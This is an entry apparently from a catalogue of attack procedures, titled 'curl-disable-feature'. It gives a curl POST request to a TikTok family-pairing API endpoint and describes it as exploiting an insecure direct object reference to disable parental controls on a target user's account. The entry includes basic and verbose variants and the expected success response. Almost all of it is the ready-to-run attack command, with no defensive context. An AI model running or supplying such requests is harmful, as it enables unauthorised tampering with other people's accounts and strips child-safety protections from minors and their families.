---
id: 123e4567-e89b-12d3-a456-426614174006
name: curl-disable-feature
type: command
executor: bash
data: >-
  curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H
  'Authorization: Bearer YOUR_TOKEN' -d '{"action":"disable",
  "feature":"parental_control"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.402Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - api
  - curl
  - disruption
verified: false
validated: true
submitted: true
---

# curl-disable-feature

## Command

```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"disable", "feature":"parental_control"}'
```

## Description

Exploits IDOR to disable a specific feature in the target user's family pairing via API POST.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `https://api.tiktok.com/v1/family/pair/{id}` | Endpoint | Yes |
| `-H 'Authorization: Bearer {token}'` | Auth | Yes |
| `-d '{json}'` | Disable payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"disable", "feature":"parental_control"}'
```

### Advanced Usage

```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"disable"}' -v
```

## Expected Output

HTTP 200 with {"status":"disabled" }.

## Related

- [[Related Procedure]]
